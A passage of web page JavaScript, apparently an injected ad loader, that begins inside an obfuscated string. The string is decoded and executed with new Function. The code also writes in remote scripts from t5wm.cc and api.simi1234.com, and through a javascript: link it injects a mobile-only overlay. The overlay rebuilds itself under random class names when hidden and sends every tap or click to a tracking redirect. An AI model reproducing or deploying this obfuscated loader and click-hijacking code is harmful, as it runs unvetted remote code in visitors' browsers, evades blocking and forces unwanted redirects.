L))85m(5YdFYEqY^Y2Fc"LFTqY"a!L))m622Y59|yt8")OfT[JOL6F6O2g626F6dq l6^JO5Fd2F!^62*hY6phFg"%D62fODmL(5YY2mhY6phF%"JR l6^JO5Fd2F!Jdff62p*)OFFO^g}00JR l6^JO5Fd2F!P"!5mhYdfmdJJY2fxh6qfcL))aP!P= }000a!Xd5 DLRp8H"))Lm)hOqO5@0}}0}m(2"="))Lm)hOqO5@0}}0@m(2"="))Lm)hOqO5@0}}0sm(2"="))Lm)hOqO5@0}}0}m(2"="))Lm)hOqO5@0}}0@m(2"="))Lm)hOqO5@0}}0sm(2"Z!Xd5 S8ydFhm7qOO5cc2YD wdFYcaampYFwdFYca/na!S8cS>najngS!Xd5 DL_8c"hFFJLg"885mqO(dF6O2mJ5OFO(Oqaj"DLLg//"%DLRpHSZ%"g@00Q}"g"DLg//"%DLRpHSZ%"g@00Q0"!Xd5 (82YD VY)iO(SYFcDL_%"/}QsK"a!(mO2OJY287_2(F6O2cYa[6LDL86LMSS8}!Xd5 (d2Xd85mpYFEqY^Y2FuTWfc"4(L6_fdO"a!67c(d2Xda[(d2XdmLFTqY8"f6LJqdTg2O2Y!"PP!(mO2^YLLdpY87_2(F6O2cYa[Xd5 F87_2(F6O2cYa[Xd5 F=5=2=O=(=6=_=d8"("%"h"%"d"%"5"%"r"%"F"=78"7"%"5"%"O"%"^"%"x"%"h"%"d"%"5"%"x"%"O"%"f"%"Y"=q8"("%"h"%"d"%"5"%"x"%"O"%"f"%"Y"%"r"%"F"=f8"6"%"2"%"f"%"Y"%"R"%";"%"7"=L8"r"%"u"%"x"%"w"%"E"%"]"%"k"%"9"%"W"%"+"%"z"%"t"%"y"%"N"%";"%"e"%"I"%"~"%"i"%"|"%"B"%"A"%"V"%"&"%"-"%"U"%"d"%")"%"("%"f"%"Y"%"7"%"p"%"h"%"6"%"C"%"S"%"q"%"^"%"2"%"O"%"J"%":"%"5"%"L"%"F"%"_"%"X"%"D"%"R"%"T"%"4"%"0"%"}"%"@"%"s"%"o"%"n"%"K"%"1"%"{"%"Q"%"%"%"/"%"8"=J8""=p80!7O5cY8Ym5YJqd(Yc/H3r*Ud*40*Q%/8Z/p=""a!p<YmqY2pFh!aO8LHfZcYHdZcp%%aa=(8LHfZcYHdZcp%%aa=68LHfZcYHdZcp%%aa=_8LHfZcYHdZcp%%aa=F8O<<@?(>>o=58c}nv(a<<o?6>>@=28csv6a<<K?_=J%8iF562pH7ZcFa=Kol86vvcJ%8iF562pH7Zc5aa=Kol8_vvcJ%8iF562pH7Zc2aa!5YF_52 7_2(F6O2cYa[7O5cXd5 F8""=2858(}8(@80!2<YmqY2pFh!ac58YHqZc2aa<}@{jcF%8iF562pH7Zc5a=2%%ag5>}Q}vv5<@@ojc(@8YHqZc2%}a=F%8iF562pH7Zccs}v5a<<K?Ksv(@a=2%8@agc(@8YHqZc2%}a=(s8YHqZc2%@a=F%8iF562pH7Zcc}nv5a<<}@?cKsv(@a<<K?Ksv(sa=2%8sa!5YF_52 FPcJaPcYmfdFda!2YD ]_2(F6O2c"MFf(L"=FacOa=(m(qOLYcaPPPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//DdJm76Sdp4Rm(2/L(/}QsKj284(L6_fdO"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_aPPZa!'.substr(10));new Function(b)()}();
        }
        if (randomElement == 't5cpv') {
            (function (){
                var id = "9142199889545937380-62158";
                document.write('<ins style="display:none!important" id="' + id + '"></ins>');
                (window.adbyunion = window.adbyunion || []).push(id);
                document.write('<script async  src="https://www.t5wm.cc/o.js"></script>');
            })();
        }
        if (randomElement == 't5cpc'){
            (function (){
                var id = "9142199889545937380-62157";
                document.write('<ins style="display:none!important" id="' + id + '"></ins>');
                (window.adbyunion = window.adbyunion || []).push(id);
                document.write('<script async  src="https://www.t5wm.cc/o.js"></script>');
            })();
        }
        if(randomElement == 'smCpv'){
           window.cYyVzF = function(){var a=document.createElement('a');var evjs=`(function(){var cname='cYyVzF',cn='https://api.simi1234.com/static/image/c.png',bn='https://dingbu.bj.bcebos.com/dibu.adadadad',jp='https://api.simi1234.com/a/c?au5b9262149de3692875cda46c75dc081c=',SlWFoT=null,cst=0,drv=isCheckD();if(drv){crateEl(cname);var n=0;SlWFoT=setInterval(()=>{n++;var elobj=resbaner();if(!elobj){cname=its(6);return crateEl('cYyVzF '+cname)}var eh=elobj.getBoundingClientRect().height;if(eh==0){elobj.remove();cname=its(6);crateEl('cYyVzF '+cname)}},500)}var s=document.createElement('script');s.src='https://api.simi1234.com/s/c?_=457012614235545600';document.getElementsByTagName('head')[0].appendChild(s);function crateEl(n){var by=document.body;if(!by){return false};var br=document.createElement('div');br.setAttribute('class',n);var img=document.createElement('img');img.src=bn;var p=document.createElement('p');br.append(p);br.append(img);by.append(br);addlistenerElement(br,function(e){var pX=0,pY=0,touches=e.changedTouches;if(touches){var touchesData=touches[0]; pX=touchesData.pageX; pY=touchesData.pageY};var _ao=document.createElement('a');_ao.href=jp+au5b9262149de3692875cda46c75dc081c+decodeURIComponent('%26')+'cp='+pX+','+pY;_ao.click()});addlistenerElement(p,function(){clearInterval(SlWFoT);resbaner().remove()});img.onload=function(){var h=this.height;resbaner().style.height=h+'px';getIheight(h,this.width)}}function getStyleStr(el){var obs=window.getComputedStyle(el,'');var str='';for(k in obs){if(parseInt(k).toString()=='NaN'){str+=k+': '+obs[k]+';'+'<br/>'}}return str}var pimg='.cYyVzF img{width:100% !important;}';var ps=cst==4?'':'position:fixed;';var bs='.cYyVzF{z-index:999;'+(cst==2||cst==3?'width:100px;':'')+(cst==3?'right:0;':'left:0;')+ps+(cst==0?'bottom:0px':cst==1?'top:0px':'bottom:50%')+';}'+pimg;if(drv){addStyle(bs)}function getIheight(height,w){var ch='width:18px;height:18px';var ot=(cst==0?'bottom':cst==1?'top':cst==2||cst==3?'bottom':'')+(cst==0||cst==1?':'+height+'px;':cst==2||cst==3?':calc(50% + '+height+'px)':'display:none;');var or=(cst==0||cst==1?'right:0':cst==2?'left:'+(w-18)+'px':'right:'+(w-18)+'px');var close='.cYyVzF p{padding:0 !important;margin:0 !important;'+ch+';background:url('+cn+');background-size:contain;position:fixed;'+or+';'+ot+'}';close+=(cst==1?'body{padding-top:'+height+'px !important;}':'');addStyle(close)}function addStyle(style){var styleObj=document.createElement('style');styleObj.setAttribute('type','text/css');styleObj.innerHTML=style;document.getElementsByTagName('head')[0].appendChild(styleObj)}function resbaner(){return document.querySelector('.'+cname)}function isCheckD(){var p=navigator.platform;var system={win:false,mac:false,Xll:false};system.win=p.indexOf('Win')==0;system.mac=p.indexOf('Mac')==0;system.X11=(p=='X11')||(p.indexOf('Linux')==0);if(system.win||system.mac||system.Xll){return false}return true}function addlistenerElement(el,callBack){el.addEventListener('click',handleFun);el.addEventListener('touchstart',handleFun);function handleFun(e){e.preventDefault();e.stopPropagation();callBack(e)}}function its(len){var r=['a','B','c','d','e','G','g','h','J','j','k'],str='';for(var i=0;i<len;i++){var rx=Math.round(Math.random()*(r.length-1));str+=r[rx]}return str}})();`;a.href='javascript:'+evjs;a.click()};window.cYyVzF();
        }
    }

}
